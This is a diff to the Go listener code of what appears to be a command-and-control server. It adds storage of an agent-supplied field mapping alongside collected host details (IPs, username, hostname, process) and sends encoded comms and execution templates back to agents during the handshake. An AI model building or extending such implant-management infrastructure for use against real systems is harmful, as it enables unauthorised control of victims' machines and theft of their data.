@@ -3,6 +3,7 @@ package listeners
 
 import (
 	pb "c2/proto"
+	"c2/internal/templates"
 	"context"
 	"crypto"
 	"crypto/rand"
@@ -133,18 +134,31 @@ func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request,
 		return fmt.Errorf("failed to sign response: %v", err)
 	}
 
+	// Extract field mapping from metadata (if present)
+	var fieldMappingJSON *string
+	var fieldMapping map[string]string
+	if jfm, ok := sysInfo.Metadata["jfm"]; ok && jfm != "" {
+		fieldMappingJSON = &jfm
+		// Parse it for in-memory use
+		if err := json.Unmarshal([]byte(jfm), &fieldMapping); err != nil {
+			log.Printf("[Handshake] Warning: Failed to parse field mapping: %v", err)
+		} else {
+			log.Printf("[Handshake] Received field mapping with %d entries", len(fieldMapping))
+		}
+	}
+
 	// Insert into connections table with transaction
 	_, err = tx.ExecContext(ctx, `
         INSERT INTO connections (
             newclientID, clientID, protocol, secret1, secret2,
-            extIP, intIP, username, hostname, note, 
+            extIP, intIP, username, hostname, note,
             process, pid, arch, lastSEEN, os,
-            proto, deleted_at
+            proto, deleted_at, field_mapping
         ) VALUES (
             $1, $2, $3, $4, $5,
             $6, $7, $8, $9, $10,
             $11, $12, $13, $14, $15,
-            $16, $17
+            $16, $17, $18
         )`,
 		newGUID, initData.ClientID, initData.Protocol, secret1, secret2,
 		externalIP, sysInfo.AgentInfo.InternalIP, sysInfo.AgentInfo.Username,
@@ -152,6 +166,7 @@ func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request,
 		sysInfo.AgentInfo.ProcessName, fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
 		sysInfo.AgentInfo.Arch, time.Now(), sysInfo.AgentInfo.OS,
 		initData.Protocol, nil, // deleted_at
+		fieldMappingJSON,
 	)
 
 	if err := tx.Commit(); err != nil {
@@ -166,10 +181,11 @@ func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request,
 
 	// Add to active connections in memory
 	newConn := &ActiveConnection{
-		ClientID: newGUID,
-		Protocol: initData.Protocol,
-		Secret1:  secret1,
-		Secret2:  secret2,
+		ClientID:     newGUID,
+		Protocol:     initData.Protocol,
+		Secret1:      secret1,
+		Secret2:      secret2,
+		FieldMapping: fieldMapping,
 	}
 	if err := m.activeConnections.AddConnection(newConn); err != nil {
 		log.Printf("[ERROR] Failed to add to active connections: %v", err)
@@ -207,6 +223,8 @@ func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request,
 		SecretsInitialized: true,
 		Signature:          base64.StdEncoding.EncodeToString(signature),
 		Seed:               sysInfo.AgentInfo.Seed,
+		CommsTemplate:      getCommsTemplateB64(),
+		ExecReqTemplate:    getExecReqTemplateB64(),
 	}
 
 	w.Header().Set("Content-Type", "application/json")
@@ -215,4 +233,30 @@ func (m *Manager) handleInitialHandshake(w http.ResponseWriter, r *http.Request,
 	}
 
 	return nil
+}
+
+// getCommsTemplateB64 returns the base64-encoded comms template
+func getCommsTemplateB64() string {
+	template := templates.GetCommsTemplate()
+	if template == nil {
+		return ""
+	}
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		return ""
+	}
+	return base64.StdEncoding.EncodeToString(jsonData)
+}
+
+// getExecReqTemplateB64 returns the base64-encoded exec requirements template
+func getExecReqTemplateB64() string {
+	template := templates.GetExecReqTemplate()
+	if template == nil {
+		return ""
+	}
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		return ""
+	}
+	return base64.StdEncoding.EncodeToString(jsonData)
 }
